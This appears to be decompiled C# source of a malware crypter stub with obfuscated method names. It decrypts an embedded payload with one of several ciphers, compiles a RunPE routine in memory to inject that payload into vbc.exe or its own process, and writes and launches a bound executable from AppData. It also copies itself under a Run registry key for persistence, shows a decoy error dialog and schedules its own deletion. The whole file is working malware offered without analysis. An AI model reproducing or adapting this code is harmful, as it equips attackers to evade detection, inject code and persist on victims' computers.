using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class fjYIWqNzRsrEuPM
{
	public static string yqtchzIOqOKBrSD;

	public static string lJwYYoItFcgpqET;

	[STAThread]
	public static void Main()
	{
		//IL_0602: Unknown result type (might be due to invalid IL or missing references)
		//IL_0628: Unknown result type (might be due to invalid IL or missing references)
		//IL_064b: Unknown result type (might be due to invalid IL or missing references)
		//IL_066e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0691: Unknown result type (might be due to invalid IL or missing references)
		ResourceManager resourceManager = new ResourceManager("TempRes", Assembly.GetExecutingAssembly());
		_ = Encoding.Default;
		string @string = resourceManager.GetString("crypted");
		string string2 = resourceManager.GetString("settings");
		yqtchzIOqOKBrSD = resourceManager.GetString("bind");
		lJwYYoItFcgpqET = resourceManager.GetString("runpe");
		string[] array = string2.Split(new char[1] { '%' });
		string text = array[2];
		string text2 = array[1];
		string text3 = array[4];
		string text4 = array[5];
		string text5 = array[3];
		string text6 = array[11];
		string text7 = array[6];
		string text8 = array[10];
		if (Operators.CompareString(text8, "1", false) == 0)
		{
			aXQMuDulpbuaEay();
		}
		if (Operators.CompareString(text5, "1", false) == 0)
		{
			Daanteys.Enable();
		}
		if (Operators.CompareString(text4, "1", false) == 0)
		{
			Thread thread = new Thread(mMBTPviKNdprvRd);
			thread.IsBackground = true;
			thread.Start();
		}
		if (!Environment.OSVersion.Platform.ToString().Contains("32") && !Environment.OSVersion.Platform.ToString().Contains("86"))
		{
			switch (text2)
			{
			case "RC4":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(YkqdEiNjkYEcGHU(@string, text))).Replace("%%42%%", Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "") + "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"));
				break;
			case "AES":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(PhCrUkyjFEeSSOb(@string, text))).Replace("%%42%%", Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "") + "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"));
				break;
			case "DES":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(DfrVzRBLTZVYiTu(@string, text))).Replace("%%42%%", Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "") + "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"));
				break;
			case "RC2":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(VhCqeEsmyAGjexn(@string, text))).Replace("%%42%%", Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "") + "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"));
				break;
			case "STR":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(ghWPuuObTVRPWrY(@string, text))).Replace("%%42%%", Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "") + "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"));
				break;
			case "XOR":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(ZHfmltHRHxetfJW(@string, text))).Replace("%%42%%", Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "") + "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"));
				break;
			case "TDES":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(uwffzkjdFvQZybM(@string, text))).Replace("%%42%%", Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", "") + "Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe"));
				break;
			}
		}
		else
		{
			switch (text2)
			{
			case "RC4":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(YkqdEiNjkYEcGHU(@string, text))).Replace("%%42%%", Application.get_ExecutablePath()));
				break;
			case "AES":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(PhCrUkyjFEeSSOb(@string, text))).Replace("%%42%%", Application.get_ExecutablePath()));
				break;
			case "DES":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(DfrVzRBLTZVYiTu(@string, text))).Replace("%%42%%", Application.get_ExecutablePath()));
				break;
			case "RC2":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(VhCqeEsmyAGjexn(@string, text))).Replace("%%42%%", Application.get_ExecutablePath()));
				break;
			case "STR":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(ghWPuuObTVRPWrY(@string, text))).Replace("%%42%%", Application.get_ExecutablePath()));
				break;
			case "XOR":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(ZHfmltHRHxetfJW(@string, text))).Replace("%%42%%", Application.get_ExecutablePath()));
				break;
			case "TDES":
				roKWNVYxmxtHPPs(lJwYYoItFcgpqET.Replace("%%40%%", CD.format(uwffzkjdFvQZybM(@string, text))).Replace("%%42%%", Application.get_ExecutablePath()));
				break;
			}
		}
		if (Operators.CompareString(text3, "1", false) == 0)
		{
			qfiZEWBAVDVcXYV();
		}
		if (Operators.CompareString(text7, "1", false) == 0)
		{
			switch (array[7])
			{
			case null:
			case "":
				Interaction.MsgBox((object)array[8], (MsgBoxStyle)16, (object)array[9]);
				break;
			case "Exclamation":
				Interaction.MsgBox((object)array[8], (MsgBoxStyle)48, (object)array[9]);
				break;
			case "Critical":
				Interaction.MsgBox((object)array[8], (MsgBoxStyle)16, (object)array[9]);
				break;
			case "Question":
				Interaction.MsgBox((object)array[8], (MsgBoxStyle)32, (object)array[9]);
				break;
			case "Information":
				Interaction.MsgBox((object)array[8], (MsgBoxStyle)64, (object)array[9]);
				break;
			}
		}
		if (Operators.CompareString(text6, "1", false) == 0)
		{
			coFIciVHjFSurZy();
		}
	}

	public static void mMBTPviKNdprvRd()
	{
		File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/temp.exe", Convert.FromBase64String(yqtchzIOqOKBrSD));
		Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/temp.exe");
	}

	public static void roKWNVYxmxtHPPs(string source)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		VBCodeProvider val = new VBCodeProvider();
		CompilerParameters val2 = new CompilerParameters();
		val2.set_GenerateExecutable(false);
		val2.set_GenerateInMemory(true);
		CompilerResults val3 = ((CodeDomProvider)val).CompileAssemblyFromSource(val2, new string[1] { source });
		if (((CollectionBase)(object)val3.get_Errors()).Count <= 0)
		{
			MethodInfo method = val3.get_CompiledAssembly().GetType("Inject.RunPE")!.GetMethod("InjectPE");
			method.Invoke(null, null);
		}
	}

	public static string PhCrUkyjFEeSSOb(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string YkqdEiNjkYEcGHU(string message, string password)
	{
		message = Encoding.Default.GetString(Convert.FromBase64String(message));
		int num = 0;
		int num2 = 0;
		StringBuilder stringBuilder = new StringBuilder();
		string empty = string.Empty;
		int[] array = new int[257];
		int[] array2 = new int[257];
		int length = password.Length;
		int location = 0;
		while (location <= 255)
		{
			char c = password.Substring(location % length, 1).ToCharArray()[0];
			array2[location] = Strings.Asc(c);
			array[location] = location;
			Math.Max(Interlocked.Increment(ref location), checked(location - 1));
		}
		int num3 = 0;
		int location2 = 0;
		while (location2 <= 255)
		{
			num3 = checked(num3 + array[location2] + array2[location2]) % 256;
			int num4 = array[location2];
			array[location2] = array[num3];
			array[num3] = num4;
			Math.Max(Interlocked.Increment(ref location2), checked(location2 - 1));
		}
		location = 1;
		while (location <= message.Length)
		{
			int num5 = 0;
			num = checked(num + 1) % 256;
			num2 = checked(num2 + array[num]) % 256;
			num5 = array[num];
			array[num] = array[num2];
			array[num2] = num5;
			int num6 = array[checked(array[num] + array[num2]) % 256];
			checked
			{
				char c2 = message.Substring(location - 1, 1).ToCharArray()[0];
				num5 = Strings.Asc(c2);
				int num7 = num5 ^ num6;
				stringBuilder.Append(Strings.Chr(num7));
				Math.Max(Interlocked.Increment(ref location), location - 1);
			}
		}
		empty = stringBuilder.ToString();
		stringBuilder.Length = 0;
		return empty;
	}

	public static string ZHfmltHRHxetfJW(string Input, string pass)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = Input.Length - 1;
			int num2 = default(int);
			for (int i = 0; i <= num; i += 2)
			{
				string value = Conversions.ToString(Strings.Chr((int)(Conversions.ToLong("&H" + Input.Substring(i, 2)) ^ Strings.Asc(pass[num2]))));
				stringBuilder.Append(value);
				num2 = ((num2 != pass.Length - 1) ? (num2 + 1) : 0);
			}
			return stringBuilder.ToString();
		}
	}

	public static string uwffzkjdFvQZybM(string input, string pass)
	{
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		try
		{
			byte[] array = new byte[24];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 8);
			tripleDESCryptoServiceProvider.Key = array;
			tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string ghWPuuObTVRPWrY(string Data, string key)
	{
		return Encoding.Default.GetString(ghWPuuObTVRPWrY(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)));
	}

	public static byte[] ghWPuuObTVRPWrY(byte[] Data, byte[] key)
	{
		checked
		{
			for (int i = Data.Length - 1; i >= 0; i += -1)
			{
				Data[i] = (byte)unchecked(checked((Data[i] ^ key[unchecked(i % key.Length)]) - unchecked((int)Data[checked(i + 1) % Data.Length]) + 256) % 256);
			}
			return Data;
		}
	}

	public static string VhCqeEsmyAGjexn(string input, string pass)
	{
		RC2CryptoServiceProvider rC2CryptoServiceProvider = new RC2CryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		try
		{
			byte[] array2 = (rC2CryptoServiceProvider.Key = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass)));
			rC2CryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rC2CryptoServiceProvider.CreateDecryptor();
			byte[] array3 = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array3, 0, array3.Length));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string DfrVzRBLTZVYiTu(string input, string pass)
	{
		DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		try
		{
			byte[] array = new byte[8];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 8);
			dESCryptoServiceProvider.Key = array;
			dESCryptoServiceProvider.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = dESCryptoServiceProvider.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void qfiZEWBAVDVcXYV()
	{
		try
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\jseEiuRiWjuDNIfRFtRiZFMfRFr.exe");
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue(Application.get_ProductName()) == null)
			{
				registryKey.SetValue(Application.get_ProductName(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\jseEiuRiWjuDNIfRFtRiZFMfRFr.exe");
			}
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ExitProcess(uint uExitCode);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

	public static void coFIciVHjFSurZy()
	{
		string executablePath = Application.get_ExecutablePath();
		string lpFileName = Application.get_ExecutablePath();
		MoveFileExW(Strings.Left(executablePath, GetModuleFileNameA(0, ref lpFileName, 256)), Path.GetTempPath() + "\\tmpG" + DateTime.Now.Millisecond + ".tmp", 8L);
		ExitProcess(0u);
	}

	public static void aXQMuDulpbuaEay()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		if (!NetworkInterface.GetIsNetworkAvailable())
		{
			Interaction.MsgBox((object)"You need an Internet Connection to run this programm !", (MsgBoxStyle)0, (object)"Microsoft Windows");
			Environment.Exit(0);
		}
	}
}
